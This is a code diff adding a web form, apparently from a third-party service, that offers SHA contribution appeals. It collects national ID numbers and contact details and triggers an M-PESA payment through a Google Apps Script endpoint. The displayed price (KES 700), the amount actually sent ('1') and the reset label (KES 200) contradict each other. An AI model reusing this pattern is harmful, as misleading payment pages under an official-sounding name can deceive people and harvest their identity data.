@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHA Appeal/Punguza Malipo Application</title>
+
+<style>
+body { 
+  font-family:'Segoe UI',sans-serif; 
+  background:#f3f7f6; 
+  padding:20px; 
+  margin:0;
+}
+.container { 
+  max-width:1000px; 
+  margin:auto; 
+  background:#fff; 
+  border-radius:20px; 
+  padding:35px; 
+  box-shadow:0 8px 30px rgba(0,0,0,0.08); 
+  border-top:5px solid #10b981; 
+}
+.header { text-align:center; margin-bottom:30px; }
+.icon { 
+  width:65px; height:65px; background:#10b981; border-radius:50%; 
+  display:flex; align-items:center; justify-content:center; margin:auto; 
+  color:white; font-size:26px; 
+}
+h1 { color:#059669; margin-top:15px; }
+.sub { color:#6b7280; font-size:14px; }
+
+.grid { display:grid; grid-template-columns:repeat(3,1fr); gap:18px; margin-top:15px; }
+@media(max-width:768px) { .grid { grid-template-columns:1fr; } }
+
+.field { display:flex; flex-direction:column; }
+label { font-size:13px; font-weight:600; margin-bottom:6px; }
+
+input, select { 
+  padding:14px; border-radius:10px; border:1px solid #d1d5db; outline:none; 
+}
+input:focus, select:focus { 
+  border-color:#10b981; box-shadow:0 0 0 3px rgba(16,185,129,0.2); 
+}
+
+button { 
+  margin-top:25px; width:100%; padding:15px; background:#10b981; color:white; 
+  border:none; border-radius:10px; font-size:16px; cursor:pointer; 
+}
+button:hover { background:#059669; }
+
+.screen { display:none; }
+.active { display:block; }
+
+#status { margin-top:15px; text-align:center; font-weight:bold; }
+
+.spinner { 
+  display:none; width:50px; height:50px; border:5px solid #f3f3f3; 
+  border-top:5px solid #10b981; border-radius:50%; animation:spin 1s linear infinite; 
+  margin:20px auto; 
+}
+@keyframes spin { 100% { transform:rotate(360deg); } }
+
+.mpesa-logo { width:100px; margin:20px auto; display:block; }
+
+.success-modal {
+  position: fixed; top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.7);
+  display:none; align-items:center; justify-content:center;
+}
+.success-content {
+  background:white; padding:40px; border-radius:20px; text-align:center;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+<!-- FORM -->
+<div id="formScreen" class="screen active">
+<div class="header">
+  <div class="icon">👤</div>
+  <h1>SHA Appeal/Punguza Malipo Application</h1>
+  <div class="sub">Fill all required fields to enable us appeal your contributions. We only contact you on 0780003131</div>
+</div>
+
+<form id="form">
+<div class="grid">
+
+<div class="field">
+<label>Full Names *</label>
+<input name="Full Names" required>
+</div>
+
+<div class="field">
+<label>ID Number *</label>
+<input name="ID Number" required>
+</div>
+
+<div class="field">
+<label>Phone Number *</label>
+<input name="Phone Number" required>
+</div>
+
+<div class="field">
+<label>Email address *</label>
+<input type="email" name="email_address" required>
+</div>
+
+<div class="field">
+<label>To be sent to your Whatsapp or Email *</label>
+<select name="delivery_method" required>
+<option value="">Select</option>
+<option>WhatsApp</option>
+<option>Email</option>
+</select>
+</div>
+
+</div>
+
+<div style="margin-top:20px;">
+<label>
+<input type="checkbox" id="consent" required>
+ I confirm that I have read, understood, and agree to the 
+ <a href="https://www.onlinecyber.co.ke/data-protection" target="_blank">
+ Data Protection & Privacy Policy
+ </a> and consent to my data being processed.
+</label>
+</div>
+
+<button type="submit">Proceed to Payment</button>
+</form>
+</div>
+
+  <!-- PAYMENT SCREEN -->
+  <div id="paymentScreen" class="screen">
+    <div class="header">
+      <div class="icon">💳</div>
+      <h1>Complete Payment</h1>
+      <div class="sub">Enter your M-PESA number</div>
+    </div>
+
+    <div class="field">
+      <label>M-PESA Number *</label>
+      <input id="mpesa" placeholder="07XXXXXXXX" maxlength="10">
+    </div>
+
+    <img src="https://upload.wikimedia.org/wikipedia/commons/1/15/M-PESA_LOGO-01.svg" 
+         class="mpesa-logo" alt="M-PESA">
+
+    <div id="spinner" class="spinner"></div>
+
+    <button id="payButton" onclick="payNow()">Pay Now - KES 700</button>
+
+    <div id="status"></div>
+  </div>
+
+</div>
+
+<!-- BEAUTIFUL SUCCESS MODAL -->
+<div id="successModal" class="success-modal">
+  <div class="success-content">
+    <div class="success-icon">✅</div>
+    <h2>Application Submitted Successfully!</h2>
+    <p>Your SHA Appeal request has been received and is being processed.</p>
+    <p><strong>Please check your phone and enter PIN to complete the M-PESA payment of KES 700.</strong></p>
+    <p style="color:#10b981; font-weight:600;">You will be contacted once your application is fully processed.</p>
+    
+    <button class="close-btn" onclick="closeModal()">Submit Another Application</button>
+  </div>
+</div>
+
+<script>
+// ====================== CONFIG ======================
+const scriptURL = "https://script.google.com/macros/s/AKfycby0aMfyASowK9azM11_pMMTFweF1GReFT4k_mV6PsvcvkcVbbZIqYQZuWM7OaqRSw8Zsw/exec";
+
+let formDataStore = {};
+
+// FORM SUBMISSION
+document.getElementById("form").addEventListener("submit", function(e) {
+  e.preventDefault();
+  if (!document.getElementById("consent").checked) {
+    alert("Please agree to the privacy policy.");
+    return;
+  }
+  formDataStore = Object.fromEntries(new FormData(this).entries());
+  document.getElementById("formScreen").classList.remove("active");
+  document.getElementById("paymentScreen").classList.add("active");
+});
+
+// PAYMENT FUNCTION
+async function payNow() {
+  const phoneInput = document.getElementById("mpesa").value.trim();
+  const statusEl = document.getElementById("status");
+  const spinner = document.getElementById("spinner");
+  const payButton = document.getElementById("payButton");
+
+  if (!phoneInput) {
+    statusEl.innerText = "❌ Please enter M-PESA number";
+    return;
+  }
+
+  let phone = phoneInput.replace(/\s+|\+|-/g, '');
+  if (phone.startsWith("07") && phone.length === 10) {
+    phone = "254" + phone.substring(1);
+  }
+
+  if (phone.length !== 12 || !phone.startsWith("254")) {
+    statusEl.innerText = "❌ Invalid phone number. Use 07XXXXXXXX";
+    return;
+  }
+
+  payButton.disabled = true;
+  payButton.textContent = "Processing...";
+  spinner.style.display = "block";
+  statusEl.innerText = "⏳ Sending M-PESA STK Push...";
+
+  try {
+    const payload = {
+      ...formDataStore,
+      "Phone Number": phone,
+      "M-PESA Number": phone,
+      amount: "1"
+    };
+
+    const response = await fetch(scriptURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: new URLSearchParams(payload)
+    });
+
+    const text = await response.text();
+    let result;
+    try {
+      result = JSON.parse(text);
+    } catch(e) {
+      result = { status: "error", message: "Invalid response" };
+    }
+
+    if (result.status === "success") {
+      // Show Beautiful Modal
+      document.getElementById("successModal").style.display = "flex";
+    } else {
+      statusEl.innerText = `❌ ${result.message || "Failed to send STK"}`;
+    }
+
+  } catch (err) {
+    console.error(err);
+    statusEl.innerText = "❌ Network error. Please try again.";
+  } finally {
+    setTimeout(() => {
+      spinner.style.display = "none";
+      payButton.disabled = false;
+      payButton.textContent = "Pay Now - KES 200";
+    }, 6000);
+  }
+}
+
+// Close Modal and Reset Form
+function closeModal() {
+  document.getElementById("successModal").style.display = "none";
+  location.reload();   // Refresh to start new application
+}
+</script>
+
+</body>
+</html>
